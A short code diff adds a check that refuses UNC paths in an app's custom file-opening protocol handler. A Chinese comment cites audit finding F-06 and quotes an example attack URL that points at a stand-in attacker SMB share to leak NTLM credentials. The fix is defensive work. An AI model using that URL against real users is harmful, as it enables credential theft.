@@ -31,6 +31,10 @@ export function registerHarnessOpenProtocol(): void {
   const handler: ProtocolHandler = async (request) => {
     const target = new URL(request.url).searchParams.get("path") ?? "";
     if (!target) return new Response("Missing path", { status: 400 });
+    /* ⛔⛔ 11-28 安全审计 F-06：这个协议同时注册进 BROWSER_PARTITION（远程网页所在分区），
+       且不校验来源 ⇒ 任意站点可以 `harness-open://open?path=\\attacker\share\x.pdf` 让资源管理器
+       去连 SMB、把 NTLM 凭据发给攻击者。⇒ UNC 路径一律拒绝（本机绝对路径不会以 \\ 开头）。 */
+    if (/^[\\/]{2}/.test(target)) return new Response("UNC path refused", { status: 403 });
     if (!OPENABLE.test(target)) return new Response("Unsupported file type", { status: 415 });
     try {
       const failure = await shell.openPath(target);
